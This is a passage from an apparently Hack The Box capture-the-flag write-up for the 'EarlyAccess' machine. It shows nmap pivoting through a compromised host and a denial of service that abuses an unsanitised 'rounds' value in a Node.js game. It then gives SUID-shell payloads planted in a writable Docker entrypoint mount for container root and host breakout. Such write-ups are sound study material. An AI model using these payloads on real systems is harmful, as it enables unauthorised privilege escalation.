# 172.19.0.0/16 dev br-49bd1a4995c9 proto kernel scope link src 172.19.0.1 
ip addr
# 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
#     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
#     inet 127.0.0.1/8 scope host lo
#        valid_lft forever preferred_lft forever
# 2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
#     link/ether 00:50:56:b9:02:5f brd ff:ff:ff:ff:ff:ff
#     inet 10.10.11.110/23 brd 10.10.11.255 scope global ens160
#        valid_lft forever preferred_lft forever
# 3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
#     link/ether 02:42:8a:19:82:d7 brd ff:ff:ff:ff:ff:ff
#     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
#        valid_lft forever preferred_lft forever
# 4: br-36357be55c4b: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
#     link/ether 02:42:de:0a:34:38 brd ff:ff:ff:ff:ff:ff
#     inet 172.18.0.1/16 brd 172.18.255.255 scope global br-36357be55c4b
#        valid_lft forever preferred_lft forever
# 5: br-49bd1a4995c9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
#     link/ether 02:42:3d:fc:0e:f5 brd ff:ff:ff:ff:ff:ff
#     inet 172.19.0.1/16 brd 172.19.255.255 scope global br-49bd1a4995c9
#        valid_lft forever preferred_lft forever
# 7: veth3d5568d@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-49bd1a4995c9 state UP group default 
#     link/ether b2:91:00:33:b5:48 brd ff:ff:ff:ff:ff:ff link-netnsid 0
# 9: veth43674e6@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-49bd1a4995c9 state UP group default 
#     link/ether a2:04:85:ce:2a:f0 brd ff:ff:ff:ff:ff:ff link-netnsid 1
# 11: veth628570a@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-36357be55c4b state UP group default 
#     link/ether 3a:93:01:e9:3d:fe brd ff:ff:ff:ff:ff:ff link-netnsid 2
# 15: veth7b3024e@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-36357be55c4b state UP group default 
#     link/ether 8e:0a:8e:0f:83:56 brd ff:ff:ff:ff:ff:ff link-netnsid 3
# 17: veth92f8965@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-36357be55c4b state UP group default 
#     link/ether 9a:33:10:6d:5c:80 brd ff:ff:ff:ff:ff:ff link-netnsid 5
# 19: vetha02442e@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-36357be55c4b state UP group default 
#     link/ether 2e:24:97:98:80:4f brd ff:ff:ff:ff:ff:ff link-netnsid 6
```

This time we'll forward Nmap scans through the compromised box, rather than
using Bash / Netcat:

```bash
# disble port scanning for efficiency
./nmap -sn -PE -PS443 -PA80 -PP -oN hosts.nmap 172.17-19.0.0-255
# # Nmap 7.91SVN scan initiated Thu Nov 18 21:34:18 2021 as: ./nmap -sn -PE -PS443 -PA80 -PP -oN hosts.nmap 172.17-19.0.0-255
# Cannot find nmap-payloads. UDP payloads are disabled.
# Nmap scan report for 172.17.0.1
# Nmap scan report for 172.18.0.1
# Nmap scan report for 172.18.0.2
# Nmap scan report for 172.18.0.100
# Nmap scan report for 172.18.0.101
# Nmap scan report for 172.18.0.102
# Nmap scan report for 172.19.0.1
# Nmap scan report for 172.19.0.2
# Nmap scan report for 172.19.0.3
# # Nmap done at Thu Nov 18 21:34:38 2021 -- 768 IP addresses (9 hosts up) scanned in 19.35 seconds
./nmap --datadir ./data/ -n -Pn -A -oN ports.tcp.nmap -iL hosts
# Starting Nmap 7.91SVN ( https://nmap.org ) at 2021-11-18 21:55 CET
# Nmap scan report for 172.17.0.1
# Host is up (0.00044s latency).
# Not shown: 997 closed tcp ports (conn-refused)
# PORT    STATE SERVICE  VERSION
# 22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# | ssh-hostkey: 
# |   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
# |   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
# |_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
# 80/tcp  open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: Did not follow redirect to https://earlyaccess.htb/
# 443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: EarlyAccess
# | ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
# | Not valid before: 2021-08-18T14:46:57
# |_Not valid after:  2022-08-18T14:46:57
# |_ssl-date: TLS randomness does not represent time
# | tls-alpn: 
# |_  http/1.1
# Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap scan report for 172.18.0.1
# Host is up (0.00047s latency).
# Not shown: 997 closed tcp ports (conn-refused)
# PORT    STATE SERVICE  VERSION
# 22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# | ssh-hostkey: 
# |   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
# |   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
# |_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
# 80/tcp  open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: Did not follow redirect to https://earlyaccess.htb/
# 443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: EarlyAccess
# | ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
# | Not valid before: 2021-08-18T14:46:57
# |_Not valid after:  2022-08-18T14:46:57
# |_ssl-date: TLS randomness does not represent time
# | tls-alpn: 
# |_  http/1.1
# Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap scan report for 172.18.0.2
# Host is up (0.00042s latency).
# All 1000 scanned ports on 172.18.0.2 are in ignored states.
# Not shown: 1000 closed tcp ports (conn-refused)

# Nmap scan report for 172.18.0.100
# Host is up (0.00042s latency).
# Not shown: 999 closed tcp ports (conn-refused)
# PORT     STATE SERVICE VERSION
# 3306/tcp open  mysql   MySQL 8.0.25
# | mysql-info: 
# |   Protocol: 10
# |   Version: 8.0.25
# |   Thread ID: 16030
# |   Capabilities flags: 65535
# |   Some Capabilities: Support41Auth, InteractiveClient, LongPassword, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsTransactions, FoundRows, Speaks41ProtocolNew, IgnoreSigpipes, ConnectWithDatabase, Speaks41ProtocolOld, ODBCClient, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
# |   Status: Autocommit
# |   Salt: pr\x07u"u1Qw.\x0F\9t\F\x0C19Y
# |_  Auth Plugin Name: caching_sha2_password
# | ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
# | Not valid before: 2021-09-05T13:20:51
# |_Not valid after:  2031-09-03T13:20:51
# |_ssl-date: TLS randomness does not represent time

# Nmap scan report for 172.18.0.101
# Host is up (0.00039s latency).
# Not shown: 999 closed tcp ports (conn-refused)
# PORT     STATE SERVICE VERSION
# 5000/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.8.11)
# |_http-server-header: Werkzeug/2.0.1 Python/3.8.11
# |_http-title: Site doesn't have a title (application/json).

# Nmap scan report for 172.18.0.102
# Host is up (0.00042s latency).
# Not shown: 998 closed tcp ports (conn-refused)
# PORT    STATE SERVICE  VERSION
# 80/tcp  open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: Did not follow redirect to https://earlyaccess.htb/
# 443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: EarlyAccess
# | ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
# | Not valid before: 2021-08-18T14:46:57
# |_Not valid after:  2022-08-18T14:46:57
# |_ssl-date: TLS randomness does not represent time
# | tls-alpn: 
# |_  http/1.1
# Service Info: Host: 172.18.0.102

# Nmap scan report for 172.19.0.1
# Host is up (0.00044s latency).
# Not shown: 997 closed tcp ports (conn-refused)
# PORT    STATE SERVICE  VERSION
# 22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# | ssh-hostkey: 
# |   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
# |   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
# |_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
# 80/tcp  open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: Did not follow redirect to https://earlyaccess.htb/
# 443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: EarlyAccess
# | ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
# | Not valid before: 2021-08-18T14:46:57
# |_Not valid after:  2022-08-18T14:46:57
# |_ssl-date: TLS randomness does not represent time
# | tls-alpn: 
# |_  http/1.1
# Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap scan report for 172.19.0.2
# Host is up (0.00047s latency).
# All 1000 scanned ports on 172.19.0.2 are in ignored states.
# Not shown: 1000 closed tcp ports (conn-refused)

# Nmap scan report for 172.19.0.3
# Host is up (0.00048s latency).
# Not shown: 998 closed tcp ports (conn-refused)
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
# | ssh-hostkey: 
# |   2048 34:85:7b:25:5f:a1:19:56:92:4c:74:63:4f:ef:67:b4 (RSA)
# |   256 4a:68:db:f1:b6:b4:d5:34:d6:4f:a7:56:62:12:15:ba (ECDSA)
# |_  256 74:39:21:94:c2:e2:80:5d:97:29:48:28:63:85:d6:4d (ED25519)
# 9999/tcp open  http    Node.js (Express middleware)
# |_http-title: Rock v0.0.1
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Post-scan script results:
# | ssh-hostkey: Possible duplicate hosts
# | Key 256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519) used by:
# |   172.17.0.1
# |   172.18.0.1
# |   172.19.0.1
# | Key 2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA) used by:
# |   172.17.0.1
# |   172.18.0.1
# |   172.19.0.1
# | Key 256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA) used by:
# |   172.17.0.1
# |   172.18.0.1
# |_  172.19.0.1
# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 9 IP addresses (9 hosts up) scanned in 32.30 seconds
```

`172.18.0.100` hosts the MySQL server that is mentionned in the healthcheck:

```bash
mysql -h'172.18.0.100' -u'drew' -p'drew' -e'show tables;'
```

All `172.*.0.1` addresses seem to be hosting the same webserver. The port 9999
on `172.19.0.3` looks interesting:

```bash
curl http://172.19.0.3:9999/
# <!DOCTYPE html>
# <html lang="en">
#     <head>
#         <title>Rock v0.0.1</title>
#     </head>
#     <body>
#         <div class="container">
#             <div class="panel panel-default">
#                 <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
#                     <div class="panel-body">
#                         <div class="card header">
#                             <div class="card-header">
#                                 Test-environment for Game-dev
#                             </div>
#                             <div>
#                                 <h2>Choose option</h2>
#                                 <div>
#                                     <a href="/autoplay"><img src="x" alt="autoplay"</a>
#                                     <a href="/rock"><img src="x" alt="rock"></a> 
#                                     <a href="/paper"><img src="x" alt="paper"></a>
#                                     <a href="/scissors"><img src="x" alt="scissors"></a>
#                                 </div>
#                                 <h3>Result of last game:</h3>
                                
#                             </div>
#                         </div>
#                     </div>
#                 </div>
#             </div>
#         </div>
#     </body>
# </html>
curl http://172.19.0.3:9999/autoplay
# <!DOCTYPE html>
# <html lang="en">
#     <head>
#         <title>Rock v0.0.1</title>
#     </head>
#     <body>
#         <div class="container">
#             <div class="panel panel-default">
#                 <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
#                     <div class="panel-body">
#                         <div class="card header">
#                             <div class="card-header">
#                                 Test-environment for Game-dev
#                             </div>
#                             <div class="card-body">
#                                 <form action="/autoplay" method="POST">
#                                     <ul style="list-style-type: none">
#                                         <li>
#                                             <label for="rounds">Rounds:</label>
#                                             <input type="number" placeholder="3" value="3" name="rounds" min="1" max="100">
#                                             <button id="btn" class="btn btn-outline-dark center play-btn" onclick="">Start game</button>
#                                         </li>
#                                         <li>
#                                             <label for="verbose">Verbose</label>
#                                             <input type="checkbox" name="verbose" id="verbose" value="false">
#                                         </li>
#                                     </ul>
#                                 </form>
#                             </div>
#                         </div>
#                     </div>
#                 </div>
#             </div>
#         </div>
#     </body>
# </html>
```

May-be this is the unstable game that was talked about in the mail.

### Root in the Docker Container

Upon reboot, the `game-server` executes the scripts in `/docker-entrypoint.d/`:

```bash
cat /entrypoint.sh 
# #!/bin/bash
# for ep in /docker-entrypoint.d/*; do
# if [ -x "${ep}" ]; then
#     echo "Running: ${ep}"
#     "${ep}" &
#   fi
# done
# tail -f /dev/null
ls -lah /docker-entrypoint.d/
# total 12K
# drwxrwxr-t 2 root 1000 4.0K Nov 19 13:55 .
# drwxr-xr-x 1 root root 4.0K Nov 19 11:50 ..
# -rwxr-xr-x 1 root root  100 Nov 19 13:55 node-server.sh
```

And the folder `/docker-entrypoint.d/` in the game server / container is
mounted the folder `/opt/docker-entrypoint.d/` from the host system:

```bash
ls -lah /opt/docker-entrypoint.d/
# total 12K
# drwxrwxr-t 2 root drew 4.0K Nov 19 14:58 .
# drwxr-xr-x 4 root root 4.0K Jul 14 12:26 ..
# -rwxr-xr-x 1 root root  100 Nov 19 14:58 node-server.sh
cat /opt/docker-entrypoint.d/node-server.sh 
# service ssh start

# cd /usr/src/app

# # Install dependencies
# npm install

# sudo -u node node server.js
```

And on the game server:

```bash
find / -name '*server.js' 2>/dev/null
# /usr/src/app/server.js
```

The autoplay function -advertised by `http://172.19.0.3:9999/autoplay`- is
meant to process an integer counter:

```javascript
while(rounds != 0)
{
    ...
    // Decrease round
    rounds = rounds - 1;
}
```

Yet it doesn't perform any sanitization on the input value:

```javascript
rounds = req.body.rounds;
```

If given a floating point value for `rounds`, the server will run endlessly:

```bash
curl -X POST -d "rounds=3.333333333" http://172.19.0.3:9999/autoplay
```

And the infinite loop will trigger a system reboot.

Upon reboot, the files in the docker folder are executed as root. So we want
to place a payload there:

```bash
#!/bin/bash
cp /bin/bash /tmp/heyhey
chown root:root /tmp/heyhey
chmod u+s /tmp/heyhey
chmod +x /tmp/heyhey
```

And then restart the server with the command above. Finally the payload can be
exploited inside the game server:

```bash
/tmp/heyhey -p
```

This may require several attempts / a staging script to bypass the folder cleanup:

```bash
while :; do cp -fr heyhey.sh /opt/docker-entrypoint.d/; done
```

### System Root

Alright, last effort! The step that gave us root access on the game container
works also backward: the files created from the container are owned by root.

```bash
cp /bin/sh /docker-entrypoint.d/yo
chown root:1000 /docker-entrypoint.d/yo
chmod +x /docker-entrypoint.d/yo
chmod u+s /docker-entrypoint.d/yo
````

if you have a root shell on game-server container then u will see that the drew's /opt/docker-contain* directory is mounted to /docker-container* in game-server root shell.
So u have writable mounted folder.
Follow this to get root!
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mount-writable-folder
Mount writable folder section!

[author-profile]: https://app.hackthebox.com/users/134448
[docker-breakout]: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#writable-hostpath-mount

[admin-access]: images/screenshots/admin.png
[admin-support]: images/screenshots/support.png
[game-error]: images/screenshots/game-error.png
[game-key-validator]: images/screenshots/game-key-validator.png
[game-scoreboard]: images/screenshots/game-scoreboard.png
[game-version]: images/screenshots/game-version.png
[scoreboard-error]: images/screenshots/scoreboard-error.png
[successful-sqli]: images/screenshots/successful-sqli.png
